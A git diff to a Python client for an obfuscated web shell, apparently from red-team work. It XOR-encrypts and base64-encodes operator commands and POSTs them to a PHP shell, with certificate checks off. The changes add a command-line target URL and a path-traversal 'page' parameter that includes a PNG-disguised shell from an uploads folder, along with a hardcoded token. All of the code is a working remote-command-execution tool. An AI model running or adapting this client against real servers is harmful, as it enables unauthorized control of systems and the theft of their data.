@@ -2,6 +2,9 @@ import requests
 import base64
 import urllib3
 import re 
+import argparse
+
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 key = "RedTeam2024"
@@ -33,14 +36,16 @@ def get_user_command():
         exit(0)
     return base64_encode(xor_bytes(command.encode('utf-8'), key))
 
-def send_command(command):
-    url = "https://megacorpmon.int/webshell_obf.php"
+def send_command(command, url, png_name):
+    full_url = url
     payload = {
+        "page": f"../../public/uploads/{png_name}",
+        "token": "a646697405a18511bbe5a9b9e1872753eb4dcfa4",  
         "auth": auth,
         "data": command
     }
     try:
-        response = requests.post(url, headers=headers, data=payload, verify=False, proxies=proxies)
+        response = requests.post(full_url, headers=headers, data=payload, verify=False, proxies=proxies)
         if response.status_code == 200:
             return response
         else:
@@ -65,7 +70,11 @@ def get_response(response):
 def main():
     while True:
         command = get_user_command()
-        response = send_command(command)
+        parser = argparse.ArgumentParser(description="Send obfuscated command to server")
+        parser.add_argument("url", help="Target URL")
+        parser.add_argument("png_name", help="PNG filename to use")
+        args, unknown = parser.parse_known_args()
+        response = send_command(command, args.url, args.png_name)
         if response:
             print("Response from server:", get_response(response))
         else:
